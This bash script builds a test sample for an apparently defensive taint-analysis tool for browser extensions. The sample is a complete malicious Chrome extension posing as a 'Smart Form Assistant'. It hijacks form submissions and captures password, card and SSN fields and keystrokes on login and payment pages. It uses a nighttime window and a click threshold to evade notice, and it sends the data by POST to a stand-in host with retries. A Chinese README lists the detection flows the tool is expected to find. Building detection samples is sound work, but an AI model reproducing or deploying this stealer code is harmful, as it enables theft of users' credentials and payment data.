#!/bin/bash
# Script to create event_driven_attack sample

SAMPLE_DIR="samples/event_driven_attack"

echo "Creating event_driven_attack sample files..."

# Create manifest.json
cat > "$SAMPLE_DIR/manifest.json" << 'EOF'
{
  "manifest_version": 3,
  "name": "Smart Form Assistant",
  "version": "1.5.0",
  "description": "Intelligent form filling and click tracking assistant",
  "permissions": ["storage", "tabs", "webNavigation"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "background.js",
    "type": "module"
  },
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["content.js"],
      "run_at": "document_end"
    }
  ]
}
EOF

# Create triggers.js
cat > "$SAMPLE_DIR/triggers.js" << 'EOF'
// triggers.js - Trigger condition checkers

// Check if current time is within attack window
export function isTimeWindowActive() {
  const hour = new Date().getHours();
  // Active between 23:00 and 06:00 (nighttime)
  return hour >= 23 || hour <= 6;
}

// Check if URL matches target patterns
export function isTargetUrl(url) {
  const targets = [
    /login/i,
    /signin/i,
    /account/i,
    /checkout/i,
    /payment/i
  ];
  return targets.some(pattern => pattern.test(url));
}

// Check if element matches sensitive patterns
export function isSensitiveElement(element) {
  const type = element.type?.toLowerCase();
  const name = element.name?.toLowerCase() || '';
  const id = element.id?.toLowerCase() || '';

  const sensitivePatterns = [
    'password', 'pass', 'pwd',
    'credit', 'card', 'cvv',
    'ssn', 'social'
  ];

  return type === 'password' ||
         sensitivePatterns.some(p => name.includes(p) || id.includes(p));
}

// Check click count threshold
let clickCount = 0;
export function shouldActivateOnClick() {
  clickCount++;
  return clickCount >= 5;  // Activate after 5 clicks
}

// Check navigation count
let navCount = 0;
export function shouldActivateOnNav() {
  navCount++;
  return navCount >= 3;  // Activate after 3 navigations
}
EOF

# Create hijacker.js
cat > "$SAMPLE_DIR/hijacker.js" << 'EOF'
// hijacker.js - Form and click hijacking functions

// Hijack form submission
export function hijackForm(form, callback) {
  form.addEventListener("submit", (event) => {
    event.preventDefault();

    const formData = new FormData(form);
    const data = {};

    for (const [key, value] of formData.entries()) {
      data[key] = value;
    }

    callback(data, form);

    // Continue with original submission after stealing
    setTimeout(() => form.submit(), 100);
  }, true);
}

// Hijack link clicks
export function hijackLinks(selector, callback) {
  document.querySelectorAll(selector).forEach(link => {
    link.addEventListener("click", (event) => {
      const href = link.href;
      const text = link.textContent;

      callback({ href, text, element: link });
    }, true);
  });
}

// Monitor input changes
export function monitorInputs(selector, callback) {
  document.querySelectorAll(selector).forEach(input => {
    input.addEventListener("input", (event) => {
      if (input.value.length > 3) {  // Only capture substantial input
        callback({
          type: input.type,
          name: input.name,
          value: input.value,              // SOURCE: ELEMENT_VALUE
          timestamp: Date.now()
        });
      }
    });
  });
}
EOF

# Create content.js
cat > "$SAMPLE_DIR/content.js" << 'EOF'
// content.js - Event-driven credential harvesting
// Frame: CS_1 (matches: <all_urls>)
//
// Flow patterns exercised:
//   1. ELEMENT_VALUE (on click event) → CHROME_RUNTIME_SENDMESSAGE (PRIVILEGE_ESCALATION)
//   2. ELEMENT_VALUE (on form submit) → CHROME_LOCAL_STORAGE (STORAGE_POSOING)
//   3. DOCUMENT_URL (on navigation) → FETCH_RESOURCE (REQUEST_FORGERY)
//
// Trigger mechanisms:
//   - Click count threshold
//   - URL pattern matching
//   - Time window (nighttime only)
//   - Form submission events
//   - Navigation events

import { isTimeWindowActive, isTargetUrl, isSensitiveElement, shouldActivateOnClick } from "./triggers.js";
import { hijackForm, hijackLinks, monitorInputs } from "./hijacker.js";

let isActivated = false;
let capturedData = [];

// ─── Click-Triggered Activation ────────────────────────────────────
document.addEventListener("click", (event) => {
  if (!isActivated && shouldActivateOnClick()) {
    isActivated = true;
    console.log("[Form Assistant] Activated after click threshold");
    startMonitoring();
  }
});

// ─── URL-Triggered Monitoring ──────────────────────────────────────
function startMonitoring() {
  // Only monitor on target URLs
  if (!isTargetUrl(window.location.href)) {
    return;
  }

  // Only active during time window
  if (!isTimeWindowActive()) {
    setTimeout(startMonitoring, 60000);  // Check again in 1 minute
    return;
  }

  setupFormHijacking();
  setupLinkHijacking();
  setupInputMonitoring();
}

// ─── Form Hijacking ────────────────────────────────────────────────
// SOURCE: ELEMENT_VALUE → SINK: CHROME_LOCAL_STORAGE
function setupFormHijacking() {
  const forms = document.querySelectorAll("form");

  forms.forEach(form => {
    hijackForm(form, (formData, formElement) => {
      // Extract sensitive fields
      const sensitive = {};

      for (const [key, value] of Object.entries(formData)) {
        const input = formElement.querySelector(`[name="${key}"]`);
        if (input && isSensitiveElement(input)) {
          sensitive[key] = value;                             // SOURCE: ELEMENT_VALUE
        }
      }

      if (Object.keys(sensitive).length > 0) {
        const record = {
          url: window.location.href,
          data: sensitive,
          timestamp: Date.now(),
          trigger: "form_submit"
        };

        capturedData.push(record);

        // Store locally
        chrome.storage.local.get(["captured"], (result) => {
          const existing = result.captured || [];
          existing.push(record);
          chrome.storage.local.set({ captured: existing });   // SINK CHROME_LOCAL_STORAGE
        });

        // Notify background
        chrome.runtime.sendMessage({
          type: "FORM_CAPTURED",
          data: sensitive                                      // SINK CHROME_RUNTIME_SENDMESSAGE
        });
      }
    });
  });
}

// ─── Link Hijacking ────────────────────────────────────────────────
// Track which links users click
function setupLinkHijacking() {
  hijackLinks("a[href]", (linkData) => {
    chrome.runtime.sendMessage({
      type: "LINK_CLICKED",
      href: linkData.href,
      text: linkData.text,
      source: window.location.href
    });
  });
}

// ─── Input Monitoring ──────────────────────────────────────────────
// SOURCE: ELEMENT_VALUE → CHROME_RUNTIME_SENDMESSAGE
function setupInputMonitoring() {
  monitorInputs('input[type="password"], input[type="text"], input[type="email"]', (inputData) => {
    chrome.runtime.sendMessage({
      type: "INPUT_CAPTURED",
      field: inputData.name,
      value: inputData.value,                                  // SOURCE: ELEMENT_VALUE
      url: window.location.href
    });
  });
}

// ─── Navigation-Triggered Actions ──────────────────────────────────
let lastUrl = window.location.href;
setInterval(() => {
  const currentUrl = window.location.href;
  if (currentUrl !== lastUrl) {
    lastUrl = currentUrl;

    // Send navigation event
    chrome.runtime.sendMessage({
      type: "NAVIGATION",
      from: lastUrl,
      to: currentUrl,
      timestamp: Date.now()
    });

    // Restart monitoring on new page
    if (isActivated) {
      startMonitoring();
    }
  }
}, 1000);

console.log("[Form Assistant] Event listeners registered");
EOF

# Create background.js
cat > "$SAMPLE_DIR/background.js" << 'EOF'
// background.js - Coordinate event-driven attacks
// Frame: BG_1
//
// Flow patterns:
//   1. CHROME_RUNTIME_ONMESSAGE (captured data) → FETCH_RESOURCE (DATA_LEAK)

const SERVER_URL = "https://analytics.form-helper.example/api/events";

// ─── Message Handler ───────────────────────────────────────────────
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {

  // Form capture → exfiltrate
  if (msg.type === "FORM_CAPTURED") {
    const payload = {
      type: "form",
      data: msg.data,                                          // SOURCE
      tab: sender.tab?.id,
      url: sender.url,
      timestamp: Date.now()
    };

    exfiltrate(payload);
  }

  // Input capture → exfiltrate
  if (msg.type === "INPUT_CAPTURED") {
    const payload = {
      type: "input",
      field: msg.field,
      value: msg.value,                                        // SOURCE
      url: msg.url,
      timestamp: Date.now()
    };

    exfiltrate(payload);
  }

  // Link click → exfiltrate
  if (msg.type === "LINK_CLICKED") {
    const payload = {
      type: "click",
      href: msg.href,
      text: msg.text,
      source: msg.source,
      timestamp: Date.now()
    };

    exfiltrate(payload);
  }

  return true;
});

// ─── Exfiltration ──────────────────────────────────────────────────
// SINK: FETCH_RESOURCE
async function exfiltrate(payload) {
  try {
    await fetch(SERVER_URL, {                                  // SINK FETCH_RESOURCE
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    console.log("[BG] Event exfiltrated:", payload.type);
  } catch (error) {
    // Store for retry
    chrome.storage.local.get(["pending"], (result) => {
      const pending = result.pending || [];
      pending.push(payload);
      chrome.storage.local.set({ pending });
    });
  }
}

// ─── Retry Failed Exfiltrations ────────────────────────────────────
setInterval(async () => {
  const result = await chrome.storage.local.get(["pending"]);
  const pending = result.pending || [];

  if (pending.length > 0) {
    for (const payload of pending) {
      await exfiltrate(payload);
    }
    await chrome.storage.local.set({ pending: [] });
  }
}, 300000);  // Retry every 5 minutes
EOF

# Create README.md
cat > "$SAMPLE_DIR/README.md" << 'EOF'
# Event-Driven Attack Sample

## 攻击场景

基于用户行为和浏览器事件的触发式攻击，模拟真实的表单劫持和行为追踪。

## 触发机制

1. **点击计数** - 点击 5 次后激活
2. **URL 模式** - 匹配 login/payment 等页面
3. **时间窗口** - 仅在 23:00-06:00 活跃
4. **表单提交** - 拦截表单提交事件
5. **导航检测** - 监听页面跳转

## 劫持技术

1. **表单劫持** - event.preventDefault() 拦截提交
2. **链接劫持** - 追踪所有链接点击
3. **输入监控** - 实时监控敏感输入
4. **导航追踪** - 记录浏览路径

## 预期检测流程

### 流程 1: ELEMENT_VALUE → CHROME_LOCAL_STORAGE (STORAGE_POSOING)
### 流程 2: ELEMENT_VALUE → CHROME_RUNTIME_SENDMESSAGE → FETCH_RESOURCE (DATA_LEAK)

## 运行测试

```bash
npm run build
node dist/main.js analyze --type DIR --input ./samples/event_driven_attack/ --out ./output/event_driven_attack/ --id aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

## 检测挑战

- ✅ 事件监听器中的污点追踪
- ✅ event.preventDefault 后的流程分析
- ⚠️ 条件触发对覆盖率的影响
- ✅ 跨消息通道的污点传播
EOF

echo "✅ Sample 3 (event_driven_attack) created successfully!"
echo ""
echo "Files created:"
ls -la "$SAMPLE_DIR"
